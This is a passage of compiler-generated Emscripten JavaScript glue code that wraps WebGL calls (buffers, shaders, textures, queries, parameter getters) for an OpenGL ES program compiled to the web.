            GLctx.extClipControl["clipControlEXT"](origin, depth)
        }
            ;
        var _emscripten_glColorMask = (red, green, blue, alpha) => {
            GLctx.colorMask(!!red, !!green, !!blue, !!alpha)
        }
            ;
        var _emscripten_glCompileShader = shader => {
            GLctx.compileShader(GL.shaders[shader])
        }
            ;
        var _emscripten_glCompressedTexImage2D = (target, level, internalFormat, width, height, border, imageSize, data) => {
            if (GL.currentContext.version >= 2) {
                if (GLctx.currentPixelUnpackBufferBinding || !imageSize) {
                    GLctx.compressedTexImage2D(target, level, internalFormat, width, height, border, imageSize, data);
                    return
                }
                GLctx.compressedTexImage2D(target, level, internalFormat, width, height, border, HEAPU8, data, imageSize);
                return
            }
            GLctx.compressedTexImage2D(target, level, internalFormat, width, height, border, HEAPU8.subarray(data, data + imageSize))
        }
            ;
        var _emscripten_glCompressedTexImage3D = (target, level, internalFormat, width, height, depth, border, imageSize, data) => {
            if (GLctx.currentPixelUnpackBufferBinding) {
                GLctx.compressedTexImage3D(target, level, internalFormat, width, height, depth, border, imageSize, data)
            } else {
                GLctx.compressedTexImage3D(target, level, internalFormat, width, height, depth, border, HEAPU8, data, imageSize)
            }
        }
            ;
        var _emscripten_glCompressedTexSubImage2D = (target, level, xoffset, yoffset, width, height, format, imageSize, data) => {
            if (GL.currentContext.version >= 2) {
                if (GLctx.currentPixelUnpackBufferBinding || !imageSize) {
                    GLctx.compressedTexSubImage2D(target, level, xoffset, yoffset, width, height, format, imageSize, data);
                    return
                }
                GLctx.compressedTexSubImage2D(target, level, xoffset, yoffset, width, height, format, HEAPU8, data, imageSize);
                return
            }
            GLctx.compressedTexSubImage2D(target, level, xoffset, yoffset, width, height, format, HEAPU8.subarray(data, data + imageSize))
        }
            ;
        var _emscripten_glCompressedTexSubImage3D = (target, level, xoffset, yoffset, zoffset, width, height, depth, format, imageSize, data) => {
            if (GLctx.currentPixelUnpackBufferBinding) {
                GLctx.compressedTexSubImage3D(target, level, xoffset, yoffset, zoffset, width, height, depth, format, imageSize, data)
            } else {
                GLctx.compressedTexSubImage3D(target, level, xoffset, yoffset, zoffset, width, height, depth, format, HEAPU8, data, imageSize)
            }
        }
            ;
        var _emscripten_glCopyBufferSubData = (x0, x1, x2, x3, x4) => GLctx.copyBufferSubData(x0, x1, x2, x3, x4);
        var _emscripten_glCopyTexImage2D = (x0, x1, x2, x3, x4, x5, x6, x7) => GLctx.copyTexImage2D(x0, x1, x2, x3, x4, x5, x6, x7);
        var _emscripten_glCopyTexSubImage2D = (x0, x1, x2, x3, x4, x5, x6, x7) => GLctx.copyTexSubImage2D(x0, x1, x2, x3, x4, x5, x6, x7);
        var _emscripten_glCopyTexSubImage3D = (x0, x1, x2, x3, x4, x5, x6, x7, x8) => GLctx.copyTexSubImage3D(x0, x1, x2, x3, x4, x5, x6, x7, x8);
        var _emscripten_glCreateProgram = () => {
            var id = GL.getNewId(GL.programs);
            var program = GLctx.createProgram();
            program.name = id;
            program.maxUniformLength = program.maxAttributeLength = program.maxUniformBlockNameLength = 0;
            program.uniformIdCounter = 1;
            GL.programs[id] = program;
            return id
        }
            ;
        var _emscripten_glCreateShader = shaderType => {
            var id = GL.getNewId(GL.shaders);
            GL.shaders[id] = GLctx.createShader(shaderType);
            return id
        }
            ;
        var _emscripten_glCullFace = x0 => GLctx.cullFace(x0);
        var _emscripten_glDeleteBuffers = (n, buffers) => {
            for (var i = 0; i < n; i++) {
                var id = HEAP32[buffers + i * 4 >> 2];
                var buffer = GL.buffers[id];
                if (!buffer)
                    continue;
                GLctx.deleteBuffer(buffer);
                buffer.name = 0;
                GL.buffers[id] = null;
                if (id == GLctx.currentPixelPackBufferBinding)
                    GLctx.currentPixelPackBufferBinding = 0;
                if (id == GLctx.currentPixelUnpackBufferBinding)
                    GLctx.currentPixelUnpackBufferBinding = 0
            }
        }
            ;
        var _emscripten_glDeleteFramebuffers = (n, framebuffers) => {
            for (var i = 0; i < n; ++i) {
                var id = HEAP32[framebuffers + i * 4 >> 2];
                var framebuffer = GL.framebuffers[id];
                if (!framebuffer)
                    continue;
                GLctx.deleteFramebuffer(framebuffer);
                framebuffer.name = 0;
                GL.framebuffers[id] = null
            }
        }
            ;
        var _emscripten_glDeleteProgram = id => {
            if (!id)
                return;
            var program = GL.programs[id];
            if (!program) {
                GL.recordError(1281);
                return
            }
            GLctx.deleteProgram(program);
            program.name = 0;
            GL.programs[id] = null
        }
            ;
        var _emscripten_glDeleteQueries = (n, ids) => {
            for (var i = 0; i < n; i++) {
                var id = HEAP32[ids + i * 4 >> 2];
                var query = GL.queries[id];
                if (!query)
                    continue;
                GLctx.deleteQuery(query);
                GL.queries[id] = null
            }
        }
            ;
        var _emscripten_glDeleteQueriesEXT = (n, ids) => {
            for (var i = 0; i < n; i++) {
                var id = HEAP32[ids + i * 4 >> 2];
                var query = GL.queries[id];
                if (!query)
                    continue;
                GLctx.disjointTimerQueryExt["deleteQueryEXT"](query);
                GL.queries[id] = null
            }
        }
            ;
        var _emscripten_glDeleteRenderbuffers = (n, renderbuffers) => {
            for (var i = 0; i < n; i++) {
                var id = HEAP32[renderbuffers + i * 4 >> 2];
                var renderbuffer = GL.renderbuffers[id];
                if (!renderbuffer)
                    continue;
                GLctx.deleteRenderbuffer(renderbuffer);
                renderbuffer.name = 0;
                GL.renderbuffers[id] = null
            }
        }
            ;
        var _emscripten_glDeleteSamplers = (n, samplers) => {
            for (var i = 0; i < n; i++) {
                var id = HEAP32[samplers + i * 4 >> 2];
                var sampler = GL.samplers[id];
                if (!sampler)
                    continue;
                GLctx.deleteSampler(sampler);
                sampler.name = 0;
                GL.samplers[id] = null
            }
        }
            ;
        var _emscripten_glDeleteShader = id => {
            if (!id)
                return;
            var shader = GL.shaders[id];
            if (!shader) {
                GL.recordError(1281);
                return
            }
            GLctx.deleteShader(shader);
            GL.shaders[id] = null
        }
            ;
        var _emscripten_glDeleteSync = id => {
            if (!id)
                return;
            var sync = GL.syncs[id];
            if (!sync) {
                GL.recordError(1281);
                return
            }
            GLctx.deleteSync(sync);
            sync.name = 0;
            GL.syncs[id] = null
        }
            ;
        var _emscripten_glDeleteTextures = (n, textures) => {
            for (var i = 0; i < n; i++) {
                var id = HEAP32[textures + i * 4 >> 2];
                var texture = GL.textures[id];
                if (!texture)
                    continue;
                GLctx.deleteTexture(texture);
                texture.name = 0;
                GL.textures[id] = null
            }
        }
            ;
        var _emscripten_glDeleteTransformFeedbacks = (n, ids) => {
            for (var i = 0; i < n; i++) {
                var id = HEAP32[ids + i * 4 >> 2];
                var transformFeedback = GL.transformFeedbacks[id];
                if (!transformFeedback)
                    continue;
                GLctx.deleteTransformFeedback(transformFeedback);
                transformFeedback.name = 0;
                GL.transformFeedbacks[id] = null
            }
        }
            ;
        var _emscripten_glDeleteVertexArrays = (n, vaos) => {
            for (var i = 0; i < n; i++) {
                var id = HEAP32[vaos + i * 4 >> 2];
                GLctx.deleteVertexArray(GL.vaos[id]);
                GL.vaos[id] = null
            }
        }
            ;
        var _glDeleteVertexArrays = _emscripten_glDeleteVertexArrays;
        var _emscripten_glDeleteVertexArraysOES = _glDeleteVertexArrays;
        var _emscripten_glDepthFunc = x0 => GLctx.depthFunc(x0);
        var _emscripten_glDepthMask = flag => {
            GLctx.depthMask(!!flag)
        }
            ;
        var _emscripten_glDepthRangef = (x0, x1) => GLctx.depthRange(x0, x1);
        var _emscripten_glDetachShader = (program, shader) => {
            GLctx.detachShader(GL.programs[program], GL.shaders[shader])
        }
            ;
        var _emscripten_glDisable = x0 => GLctx.disable(x0);
        var _emscripten_glDisableVertexAttribArray = index => {
            GLctx.disableVertexAttribArray(index)
        }
            ;
        var _emscripten_glDrawArrays = (mode, first, count) => {
            GLctx.drawArrays(mode, first, count)
        }
            ;
        var _emscripten_glDrawArraysInstanced = (mode, first, count, primcount) => {
            GLctx.drawArraysInstanced(mode, first, count, primcount)
        }
            ;
        var _glDrawArraysInstanced = _emscripten_glDrawArraysInstanced;
        var _emscripten_glDrawArraysInstancedANGLE = _glDrawArraysInstanced;
        var _emscripten_glDrawArraysInstancedARB = _glDrawArraysInstanced;
        var _emscripten_glDrawArraysInstancedEXT = _glDrawArraysInstanced;
        var _emscripten_glDrawArraysInstancedNV = _glDrawArraysInstanced;
        var tempFixedLengthArray = [];
        var _emscripten_glDrawBuffers = (n, bufs) => {
            var bufArray = tempFixedLengthArray[n];
            for (var i = 0; i < n; i++) {
                bufArray[i] = HEAP32[bufs + i * 4 >> 2]
            }
            GLctx.drawBuffers(bufArray)
        }
            ;
        var _glDrawBuffers = _emscripten_glDrawBuffers;
        var _emscripten_glDrawBuffersEXT = _glDrawBuffers;
        var _emscripten_glDrawBuffersWEBGL = _glDrawBuffers;
        var _emscripten_glDrawElements = (mode, count, type, indices) => {
            GLctx.drawElements(mode, count, type, indices)
        }
            ;
        var _emscripten_glDrawElementsInstanced = (mode, count, type, indices, primcount) => {
            GLctx.drawElementsInstanced(mode, count, type, indices, primcount)
        }
            ;
        var _glDrawElementsInstanced = _emscripten_glDrawElementsInstanced;
        var _emscripten_glDrawElementsInstancedANGLE = _glDrawElementsInstanced;
        var _emscripten_glDrawElementsInstancedARB = _glDrawElementsInstanced;
        var _emscripten_glDrawElementsInstancedEXT = _glDrawElementsInstanced;
        var _emscripten_glDrawElementsInstancedNV = _glDrawElementsInstanced;
        var _glDrawElements = _emscripten_glDrawElements;
        var _emscripten_glDrawRangeElements = (mode, start, end, count, type, indices) => {
            _glDrawElements(mode, count, type, indices)
        }
            ;
        var _emscripten_glEnable = x0 => GLctx.enable(x0);
        var _emscripten_glEnableVertexAttribArray = index => {
            GLctx.enableVertexAttribArray(index)
        }
            ;
        var _emscripten_glEndQuery = x0 => GLctx.endQuery(x0);
        var _emscripten_glEndQueryEXT = target => {
            GLctx.disjointTimerQueryExt["endQueryEXT"](target)
        }
            ;
        var _emscripten_glEndTransformFeedback = () => GLctx.endTransformFeedback();
        var _emscripten_glFenceSync = (condition, flags) => {
            var sync = GLctx.fenceSync(condition, flags);
            if (sync) {
                var id = GL.getNewId(GL.syncs);
                sync.name = id;
                GL.syncs[id] = sync;
                return id
            }
            return 0
        }
            ;
        var _emscripten_glFinish = () => GLctx.finish();
        var _emscripten_glFlush = () => GLctx.flush();
        var _emscripten_glFramebufferRenderbuffer = (target, attachment, renderbuffertarget, renderbuffer) => {
            GLctx.framebufferRenderbuffer(target, attachment, renderbuffertarget, GL.renderbuffers[renderbuffer])
        }
            ;
        var _emscripten_glFramebufferTexture2D = (target, attachment, textarget, texture, level) => {
            GLctx.framebufferTexture2D(target, attachment, textarget, GL.textures[texture], level)
        }
            ;
        var _emscripten_glFramebufferTextureLayer = (target, attachment, texture, level, layer) => {
            GLctx.framebufferTextureLayer(target, attachment, GL.textures[texture], level, layer)
        }
            ;
        var _emscripten_glFrontFace = x0 => GLctx.frontFace(x0);
        var _emscripten_glGenBuffers = (n, buffers) => {
            GL.genObject(n, buffers, "createBuffer", GL.buffers)
        }
            ;
        var _emscripten_glGenFramebuffers = (n, ids) => {
            GL.genObject(n, ids, "createFramebuffer", GL.framebuffers)
        }
            ;
        var _emscripten_glGenQueries = (n, ids) => {
            GL.genObject(n, ids, "createQuery", GL.queries)
        }
            ;
        var _emscripten_glGenQueriesEXT = (n, ids) => {
            for (var i = 0; i < n; i++) {
                var query = GLctx.disjointTimerQueryExt["createQueryEXT"]();
                if (!query) {
                    GL.recordError(1282);
                    while (i < n)
                        HEAP32[ids + i++ * 4 >> 2] = 0;
                    return
                }
                var id = GL.getNewId(GL.queries);
                query.name = id;
                GL.queries[id] = query;
                HEAP32[ids + i * 4 >> 2] = id
            }
        }
            ;
        var _emscripten_glGenRenderbuffers = (n, renderbuffers) => {
            GL.genObject(n, renderbuffers, "createRenderbuffer", GL.renderbuffers)
        }
            ;
        var _emscripten_glGenSamplers = (n, samplers) => {
            GL.genObject(n, samplers, "createSampler", GL.samplers)
        }
            ;
        var _emscripten_glGenTextures = (n, textures) => {
            GL.genObject(n, textures, "createTexture", GL.textures)
        }
            ;
        var _emscripten_glGenTransformFeedbacks = (n, ids) => {
            GL.genObject(n, ids, "createTransformFeedback", GL.transformFeedbacks)
        }
            ;
        var _emscripten_glGenVertexArrays = (n, arrays) => {
            GL.genObject(n, arrays, "createVertexArray", GL.vaos)
        }
            ;
        var _glGenVertexArrays = _emscripten_glGenVertexArrays;
        var _emscripten_glGenVertexArraysOES = _glGenVertexArrays;
        var _emscripten_glGenerateMipmap = x0 => GLctx.generateMipmap(x0);
        var __glGetActiveAttribOrUniform = (funcName, program, index, bufSize, length, size, type, name) => {
            program = GL.programs[program];
            var info = GLctx[funcName](program, index);
            if (info) {
                var numBytesWrittenExclNull = name && stringToUTF8(info.name, name, bufSize);
                if (length)
                    HEAP32[length >> 2] = numBytesWrittenExclNull;
                if (size)
                    HEAP32[size >> 2] = info.size;
                if (type)
                    HEAP32[type >> 2] = info.type
            }
        }
            ;
        var _emscripten_glGetActiveAttrib = (program, index, bufSize, length, size, type, name) => __glGetActiveAttribOrUniform("getActiveAttrib", program, index, bufSize, length, size, type, name);
        var _emscripten_glGetActiveUniform = (program, index, bufSize, length, size, type, name) => __glGetActiveAttribOrUniform("getActiveUniform", program, index, bufSize, length, size, type, name);
        var _emscripten_glGetActiveUniformBlockName = (program, uniformBlockIndex, bufSize, length, uniformBlockName) => {
            program = GL.programs[program];
            var result = GLctx.getActiveUniformBlockName(program, uniformBlockIndex);
            if (!result)
                return;
            if (uniformBlockName && bufSize > 0) {
                var numBytesWrittenExclNull = stringToUTF8(result, uniformBlockName, bufSize);
                if (length)
                    HEAP32[length >> 2] = numBytesWrittenExclNull
            } else {
                if (length)
                    HEAP32[length >> 2] = 0
            }
        }
            ;
        var _emscripten_glGetActiveUniformBlockiv = (program, uniformBlockIndex, pname, params) => {
            if (!params) {
                GL.recordError(1281);
                return
            }
            program = GL.programs[program];
            if (pname == 35393) {
                var name = GLctx.getActiveUniformBlockName(program, uniformBlockIndex);
                HEAP32[params >> 2] = name.length + 1;
                return
            }
            var result = GLctx.getActiveUniformBlockParameter(program, uniformBlockIndex, pname);
            if (result === null)
                return;
            if (pname == 35395) {
                for (var i = 0; i < result.length; i++) {
                    HEAP32[params + i * 4 >> 2] = result[i]
                }
            } else {
                HEAP32[params >> 2] = result
            }
        }
            ;
        var _emscripten_glGetActiveUniformsiv = (program, uniformCount, uniformIndices, pname, params) => {
            if (!params) {
                GL.recordError(1281);
                return
            }
            if (uniformCount > 0 && uniformIndices == 0) {
                GL.recordError(1281);
                return
            }
            program = GL.programs[program];
            var ids = [];
            for (var i = 0; i < uniformCount; i++) {
                ids.push(HEAP32[uniformIndices + i * 4 >> 2])
            }
            var result = GLctx.getActiveUniforms(program, ids, pname);
            if (!result)
                return;
            var len = result.length;
            for (var i = 0; i < len; i++) {
                HEAP32[params + i * 4 >> 2] = result[i]
            }
        }
            ;
        var _emscripten_glGetAttachedShaders = (program, maxCount, count, shaders) => {
            var result = GLctx.getAttachedShaders(GL.programs[program]);
            var len = result.length;
            if (len > maxCount) {
                len = maxCount
            }
            HEAP32[count >> 2] = len;
            for (var i = 0; i < len; ++i) {
                var id = GL.shaders.indexOf(result[i]);
                HEAP32[shaders + i * 4 >> 2] = id
            }
        }
            ;
        var _emscripten_glGetAttribLocation = (program, name) => GLctx.getAttribLocation(GL.programs[program], UTF8ToString(name));
        var writeI53ToI64 = (ptr, num) => {
            HEAPU32[ptr >> 2] = num;
            var lower = HEAPU32[ptr >> 2];
            HEAPU32[ptr + 4 >> 2] = (num - lower) / 4294967296
        }
            ;
        var webglGetExtensions = () => {
            var exts = getEmscriptenSupportedExtensions(GLctx);
            exts = exts.concat(exts.map(e => "GL_" + e));
            return exts
        }
            ;
        var emscriptenWebGLGet = (name_, p, type) => {
            if (!p) {
                GL.recordError(1281);
                return
            }
            var ret = undefined;
            switch (name_) {
                case 36346:
                    ret = 1;
                    break;
                case 36344:
                    if (type != 0 && type != 1) {
                        GL.recordError(1280)
                    }
                    return;
                case 34814:
                case 36345:
                    ret = 0;
                    break;
                case 34466:
                    var formats = GLctx.getParameter(34467);
                    ret = formats ? formats.length : 0;
                    break;
                case 33309:
                    if (GL.currentContext.version < 2) {
                        GL.recordError(1282);
                        return
                    }
                    ret = webglGetExtensions().length;
                    break;
                case 33307:
                case 33308:
                    if (GL.currentContext.version < 2) {
                        GL.recordError(1280);
                        return
                    }
                    ret = name_ == 33307 ? 3 : 0;
                    break
            }
            if (ret === undefined) {
                var result = GLctx.getParameter(name_);
                switch (typeof result) {
                    case "number":
                        ret = result;
                        break;
                    case "boolean":
                        ret = result ? 1 : 0;
                        break;
                    case "string":
                        GL.recordError(1280);
                        return;
                    case "object":
                        if (result === null) {
                            switch (name_) {
                                case 34964:
                                case 35725:
                                case 34965:
                                case 36006:
                                case 36007:
                                case 32873:
                                case 34229:
                                case 36662:
                                case 36663:
                                case 35053:
                                case 35055:
                                case 36010:
                                case 35097:
                                case 35869:
                                case 32874:
                                case 36389:
                                case 35983:
                                case 35368:
                                case 34068:
                                    {
                                        ret = 0;
                                        break
                                    }
                                default:
                                    {
                                        GL.recordError(1280);
                                        return
                                    }
                            }
                        } else if (result instanceof Float32Array || result instanceof Uint32Array || result instanceof Int32Array || result instanceof Array) {
                            for (var i = 0; i < result.length; ++i) {
                                switch (type) {
                                    case 0:
                                        HEAP32[p + i * 4 >> 2] = result[i];
                                        break;
                                    case 2:
                                        HEAPF32[p + i * 4 >> 2] = result[i];
                                        break;
                                    case 4:
                                        HEAP8[p + i] = result[i] ? 1 : 0;
                                        break
                                }
                            }
                            return
                        } else {
                            try {
                                ret = result.name | 0
                            } catch (e) {
                                GL.recordError(1280);
                                err(`GL_INVALID_ENUM in glGet${type}v: Unknown object returned from WebGL getParameter(${name_})! (error: ${e})`);
                                return
                            }
                        }
                        break;
                    default:
                        GL.recordError(1280);
                        err(`GL_INVALID_ENUM in glGet${type}v: Native code calling glGet${type}v(${name_}) and it returns ${result} of type ${typeof result}!`);
                        return
                }
            }
            switch (type) {
                case 1:
                    writeI53ToI64(p, ret);
                    break;
                case 0:
                    HEAP32[p >> 2] = ret;
                    break;
                case 2:
                    HEAPF32[p >> 2] = ret;
                    break;
                case 4:
                    HEAP8[p] = ret ? 1 : 0;
                    break
            }
        }
            ;
        var _emscripten_glGetBooleanv = (name_, p) => emscriptenWebGLGet(name_, p, 4);
        var _emscripten_glGetBufferParameteri64v = (target, value, data) => {
            if (!data) {
                GL.recordError(1281);
                return
            }
            writeI53ToI64(data, GLctx.getBufferParameter(target, value))
        }
            ;
        var _emscripten_glGetBufferParameteriv = (target, value, data) => {
            if (!data) {
                GL.recordError(1281);
                return
            }
            HEAP32[data >> 2] = GLctx.getBufferParameter(target, value)
        }
            ;
        var _emscripten_glGetError = () => {
            var error = GLctx.getError() || GL.lastError;
            GL.lastError = 0;
            return error
        }
            ;
        var _emscripten_glGetFloatv = (name_, p) => emscriptenWebGLGet(name_, p, 2);
        var _emscripten_glGetFragDataLocation = (program, name) => GLctx.getFragDataLocation(GL.programs[program], UTF8ToString(name));
        var _emscripten_glGetFramebufferAttachmentParameteriv = (target, attachment, pname, params) => {
            var result = GLctx.getFramebufferAttachmentParameter(target, attachment, pname);
            if (result instanceof WebGLRenderbuffer || result instanceof WebGLTexture) {
                result = result.name | 0
            }
            HEAP32[params >> 2] = result
        }
            ;
        var emscriptenWebGLGetIndexed = (target, index, data, type) => {
            if (!data) {
                GL.recordError(1281);
                return
            }
            var result = GLctx.getIndexedParameter(target, index);
            var ret;
            switch (typeof result) {
                case "boolean":
                    ret = result ? 1 : 0;
                    break;
                case "number":
                    ret = result;
                    break;
                case "object":
                    if (result === null) {
                        switch (target) {
                            case 35983:
                            case 35368:
                                ret = 0;
                                break;
                            default:
                                {
                                    GL.recordError(1280);
                                    return
                                }
                        }
                    } else if (result instanceof WebGLBuffer) {
                        ret = result.name | 0
                    } else {
                        GL.recordError(1280);
                        return
                    }
                    break;
                default:
                    GL.recordError(1280);
                    return
            }
            switch (type) {
                case 1:
                    writeI53ToI64(data, ret);
                    break;
                case 0:
                    HEAP32[data >> 2] = ret;
                    break;
                case 2:
                    HEAPF32[data >> 2] = ret;
                    break;
                case 4:
                    HEAP8[data] = ret ? 1 : 0;
                    break;
                default:
                    abort("internal emscriptenWebGLGetIndexed() error, bad type: " + type)
            }
        }
            ;
        var _emscripten_glGetInteger64i_v = (target, index, data) => emscriptenWebGLGetIndexed(target, index, data, 1);
        var _emscripten_glGetInteger64v = (name_, p) => {
            emscriptenWebGLGet(name_, p, 1)
        }
            ;
        var _emscripten_glGetIntegeri_v = (target, index, data) => emscriptenWebGLGetIndexed(target, index, data, 0);
        var _emscripten_glGetIntegerv = (name_, p) => emscriptenWebGLGet(name_, p, 0);
        var _emscripten_glGetInternalformativ = (target, internalformat, pname, bufSize, params) => {
            if (bufSize < 0) {
                GL.recordError(1281);
                return
            }
            if (!params) {
                GL.recordError(1281);
                return
            }
            var ret = GLctx.getInternalformatParameter(target, internalformat, pname);
            if (ret === null)
                return;
            for (var i = 0; i < ret.length && i < bufSize; ++i) {
                HEAP32[params + i * 4 >> 2] = ret[i]
            }
        }
            ;
        var _emscripten_glGetProgramBinary = (program, bufSize, length, binaryFormat, binary) => {
            GL.recordError(1282)
        }
            ;
        var _emscripten_glGetProgramInfoLog = (program, maxLength, length, infoLog) => {
            var log = GLctx.getProgramInfoLog(GL.programs[program]);
            if (log === null)
                log = "(unknown error)";
            var numBytesWrittenExclNull = maxLength > 0 && infoLog ? stringToUTF8(log, infoLog, maxLength) : 0;
            if (length)
                HEAP32[length >> 2] = numBytesWrittenExclNull
        }
            ;
        var _emscripten_glGetProgramiv = (program, pname, p) => {
            if (!p) {
                GL.recordError(1281);
                return
            }
            if (program >= GL.counter) {
                GL.recordError(1281);
                return
            }
            program = GL.programs[program];
            if (pname == 35716) {
                var log = GLctx.getProgramInfoLog(program);
                if (log === null)
                    log = "(unknown error)";
                HEAP32[p >> 2] = log.length + 1
            } else if (pname == 35719) {
                if (!program.maxUniformLength) {
                    var numActiveUniforms = GLctx.getProgramParameter(program, 35718);
                    for (var i = 0; i < numActiveUniforms; ++i) {
                        program.maxUniformLength = Math.max(program.maxUniformLength, GLctx.getActiveUniform(program, i).name.length + 1)
                    }
                }
                HEAP32[p >> 2] = program.maxUniformLength
            } else if (pname == 35722) {
                if (!program.maxAttributeLength) {
                    var numActiveAttributes = GLctx.getProgramParameter(program, 35721);
                    for (var i = 0; i < numActiveAttributes; ++i) {
                        program.maxAttributeLength = Math.max(program.maxAttributeLength, GLctx.getActiveAttrib(program, i).name.length + 1)
                    }
                }
                HEAP32[p >> 2] = program.maxAttributeLength
            } else if (pname == 35381) {
                if (!program.maxUniformBlockNameLength) {
                    var numActiveUniformBlocks = GLctx.getProgramParameter(program, 35382);
                    for (var i = 0; i < numActiveUniformBlocks; ++i) {
                        program.maxUniformBlockNameLength = Math.max(program.maxUniformBlockNameLength, GLctx.getActiveUniformBlockName(program, i).length + 1)
                    }
                }
                HEAP32[p >> 2] = program.maxUniformBlockNameLength
            } else {
                HEAP32[p >> 2] = GLctx.getProgramParameter(program, pname)
            }
        }
            ;
        var _emscripten_glGetQueryObjecti64vEXT = (id, pname, params) => {
            if (!params) {
                GL.recordError(1281);
                return
            }
            var query = GL.queries[id];
            var param;
            if (GL.currentContext.version < 2) {
                param = GLctx.disjointTimerQueryExt["getQueryObjectEXT"](query, pname)
            } else {
                param = GLctx.getQueryParameter(query, pname)
            }
            var ret;
            if (typeof param == "boolean") {
                ret = param ? 1 : 0
            } else {
                ret = param
            }
            writeI53ToI64(params, ret)
        }
            ;
        var _emscripten_glGetQueryObjectivEXT = (id, pname, params) => {
            if (!params) {
                GL.recordError(1281);
                return
            }
            var query = GL.queries[id];
            var param = GLctx.disjointTimerQueryExt["getQueryObjectEXT"](query, pname);
            var ret;
            if (typeof param == "boolean") {
                ret = param ? 1 : 0
            } else {
                ret = param
            }
            HEAP32[params >> 2] = ret
        }
            ;
        var _glGetQueryObjecti64vEXT = _emscripten_glGetQueryObjecti64vEXT;
        var _emscripten_glGetQueryObjectui64vEXT = _glGetQueryObjecti64vEXT;
        var _emscripten_glGetQueryObjectuiv = (id, pname, params) => {
            if (!params) {
                GL.recordError(1281);
                return
            }
            var query = GL.queries[id];
            var param = GLctx.getQueryParameter(query, pname);
            var ret;
            if (typeof param == "boolean") {
                ret = param ? 1 : 0
            } else {
                ret = param
            }
            HEAP32[params >> 2] = ret
        }
            ;
        var _glGetQueryObjectivEXT = _emscripten_glGetQueryObjectivEXT;
        var _emscripten_glGetQueryObjectuivEXT = _glGetQueryObjectivEXT;
        var _emscripten_glGetQueryiv = (target, pname, params) => {
            if (!params) {
                GL.recordError(1281);
                return
            }
            HEAP32[params >> 2] = GLctx.getQuery(target, pname)
        }
            ;
        var _emscripten_glGetQueryivEXT = (target, pname, params) => {
            if (!params) {
                GL.recordError(1281);
                return
            }
            HEAP32[params >> 2] = GLctx.disjointTimerQueryExt["getQueryEXT"](target, pname)
        }
            ;
        var _emscripten_glGetRenderbufferParameteriv = (target, pname, params) => {
            if (!params) {
                GL.recordError(1281);
                return
            }
            HEAP32[params >> 2] = GLctx.getRenderbufferParameter(target, pname)
        }
            ;
        var _emscripten_glGetSamplerParameterfv = (sampler, pname, params) => {
            if (!params) {
                GL.recordError(1281);
                return
            }
            HEAPF32[params >> 2] = GLctx.getSamplerParameter(GL.samplers[sampler], pname)
        }
            ;
        var _emscripten_glGetSamplerParameteriv = (sampler, pname, params) => {
            if (!params) {
                GL.recordError(1281);
                return
            }
            HEAP32[params >> 2] = GLctx.getSamplerParameter(GL.samplers[sampler], pname)
        }
            ;
        var _emscripten_glGetShaderInfoLog = (shader, maxLength, length, infoLog) => {
            var log = GLctx.getShaderInfoLog(GL.shaders[shader]);
            if (log === null)
                log = "(unknown error)";
            var numBytesWrittenExclNull = maxLength > 0 && infoLog ? stringToUTF8(log, infoLog, maxLength) : 0;
            if (length)
                HEAP32[length >> 2] = numBytesWrittenExclNull
        }
            ;
        var _emscripten_glGetShaderPrecisionFormat = (shaderType, precisionType, range, precision) => {
            var result = GLctx.getShaderPrecisionFormat(shaderType, precisionType);
            HEAP32[range >> 2] = result.rangeMin;
            HEAP32[range + 4 >> 2] = result.rangeMax;
            HEAP32[precision >> 2] = result.precision
        }
            ;
        var _emscripten_glGetShaderSource = (shader, bufSize, length, source) => {
            var result = GLctx.getShaderSource(GL.shaders[shader]);
            if (!result)
                return;
            var numBytesWrittenExclNull = bufSize > 0 && source ? stringToUTF8(result, source, bufSize) : 0;
            if (length)
                HEAP32[length >> 2] = numBytesWrittenExclNull
        }
            ;
        var _emscripten_glGetShaderiv = (shader, pname, p) => {
            if (!p) {
                GL.recordError(1281);
                return
            }
            if (pname == 35716) {
                var log = GLctx.getShaderInfoLog(GL.shaders[shader]);
                if (log === null)
                    log = "(unknown error)";
                var logLength = log ? log.length + 1 : 0;
                HEAP32[p >> 2] = logLength
            } else if (pname == 35720) {
                var source = GLctx.getShaderSource(GL.shaders[shader]);
                var sourceLength = source ? source.length + 1 : 0;
                HEAP32[p >> 2] = sourceLength
            } else {
                HEAP32[p >> 2] = GLctx.getShaderParameter(GL.shaders[shader], pname)
            }
        }
            ;
        var _emscripten_glGetString = name_ => {
            var ret = GL.stringCache[name_];
            if (!ret) {
                switch (name_) {
                    case 7939:
                        ret = stringToNewUTF8(webglGetExtensions().join(" "));
                        break;
                    case 7936:
                    case 7937:
                    case 37445:
                    case 37446:
                        var s = GLctx.getParameter(name_);
                        if (!s) {
                            GL.recordError(1280)
                        }
                        ret = s ? stringToNewUTF8(s) : 0;
                        break;
                    case 7938:
                        var webGLVersion = GLctx.getParameter(7938);
                        var glVersion = `OpenGL ES 2.0 (${webGLVersion})`;
                        if (GL.currentContext.version >= 2)
                            glVersion = `OpenGL ES 3.0 (${webGLVersion})`;
                        ret = stringToNewUTF8(glVersion);
                        break;
                    case 35724:
                        var glslVersion = GLctx.getParameter(35724);
                        var ver_re = /^WebGL GLSL ES ([0-9]\.[0-9][0-9]?)(?:$| .*)/;
                        var ver_num = glslVersion.match(ver_re);
                        if (ver_num !== null) {
                            if (ver_num[1].length == 3)
                                ver_num[1] = ver_num[1] + "0";
                            glslVersion = `OpenGL ES GLSL ES ${ver_num[1]} (${glslVersion})`
                        }
                        ret = stringToNewUTF8(glslVersion);
                        break;
                    default:
                        GL.recordError(1280)
                }
                GL.stringCache[name_] = ret
            }
            return ret
        }
            ;
        var _emscripten_glGetStringi = (name, index) => {
            if (GL.currentContext.version < 2) {
                GL.recordError(1282);
                return 0
            }
            var stringiCache = GL.stringiCache[name];
            if (stringiCache) {
                if (index < 0 || index >= stringiCache.length) {
                    GL.recordError(1281);
                    return 0
                }
                return stringiCache[index]
            }
            switch (name) {
                case 7939:
                    var exts = webglGetExtensions().map(stringToNewUTF8);
                    stringiCache = GL.stringiCache[name] = exts;
                    if (index < 0 || index >= stringiCache.length) {
                        GL.recordError(1281);
                        return 0
                    }
                    return stringiCache[index];
                default:
                    GL.recordError(1280);
                    return 0
            }
        }
            ;
        var _emscripten_glGetSynciv = (sync, pname, bufSize, length, values) => {
            if (bufSize < 0) {
                GL.recordError(1281);
                return
            }
            if (!values) {
                GL.recordError(1281);
                return
            }
            var ret = GLctx.getSyncParameter(GL.syncs[sync], pname);
            if (ret !== null) {
                HEAP32[values >> 2] = ret;
                if (length)
                    HEAP32[length >> 2] = 1
            }
        }
            ;
        var _emscripten_glGetTexParameterfv = (target, pname, params) => {
            if (!params) {
                GL.recordError(1281);
                return
            }
